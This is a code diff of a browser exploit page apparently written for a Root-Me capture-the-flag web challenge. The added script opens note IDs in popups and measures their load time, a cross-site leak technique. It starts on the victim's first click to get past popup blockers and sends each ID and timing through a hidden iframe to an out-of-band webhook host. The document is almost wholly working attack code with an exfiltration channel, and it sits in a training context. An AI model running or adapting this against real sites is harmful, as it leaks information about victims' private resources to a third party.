@@ -1,24 +1,36 @@
 <script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
-function test(i) {
+let i = 0;
+const MAX = 2000; // adjust if needed
+
+function next() {
+    if (i > MAX) return;
+
+    const start = performance.now();
     const w = window.open(TARGET + i);
 
-    setTimeout(() => {
-        let frames;
+    w.onload = () => {
+        const delta = performance.now() - start;
 
-        try {
-            frames = w.length;
-        } catch (e) {
-            frames = -1;
-        }
+        console.log("ID:", i, "TIME:", delta);
 
-        console.log("ID:", i, "frames:", frames);
+        // send result
+        const ex = document.createElement("iframe");
+        ex.src = WEBHOOK + "?id=" + i + "&t=" + delta;
+        ex.style.display = "none";
+        document.documentElement.appendChild(ex);
 
         w.close();
-    }, 1000);
+
+        i++;
+        setTimeout(next, 1200); // spacing to avoid overlap
+    };
 }
 
-test(1479);
-test(1480);
+// required for popup blockers
+document.addEventListener("click", () => {
+    next();
+}, { once: true });
 </script>
